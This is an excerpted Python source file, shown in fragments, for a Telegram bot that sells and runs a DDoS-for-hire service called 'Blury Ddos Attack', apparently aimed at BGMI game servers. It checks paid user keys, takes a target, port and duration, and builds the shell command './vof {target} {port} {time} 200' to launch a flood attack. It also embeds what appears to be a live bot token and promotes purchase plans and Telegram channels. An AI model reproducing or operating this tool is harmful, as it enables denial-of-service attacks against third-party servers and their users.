...
bot = telebot.TeleBot('7592369464:AAFRQMqtEa32h9O2BTxOIeHZZTpHjF4ECR4')
...
def authorize_user(message, func):
    ...
    if is_key_valid(message.text):
        ...
        bot.reply_to(message, "🚫KEY EXPIRED OR INVALID❌ GET NEW KEY 🔑 @BLURYFAXE ✅.")    
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                full_command = f"./vof {target} {port} {time} 200"
...
➡️ TO Start Blury Ddos Attack  : /bgmi 
...
Official Channel :-https://t.me/+k_FQo5q2HhwyN2I9
'''
...
➡️ Join Telegram :- https://t.me/+k_FQo5q2HhwyN2I9'''
...
2. Dont Run 2 Attacks At Same Time otherwise you will get Banned From Bot. 
...
def set_bot_commands():
    ...
    BotCommand("id", "Get User ID"),
        ...
        BotCommand("bgmi", "START BLURY DDOS ATTACK"),
...
def create_user_keyboard():
    ...
    button1 = KeyboardButton("♻️ START BLURY DDOS ATTACK ♻️")
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START BLURY DDOS ATTACK ♻️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒"])
def handle_user_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if message.text == "♻️ START BLURY DDOS ATTACK ♻️":
            handle_bgmi(message)
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START BLURY DDOS ATTACK ♻️", "LOGS 📊", "ALL USERS 👥", "CLEAR LOGS 🗑️"])
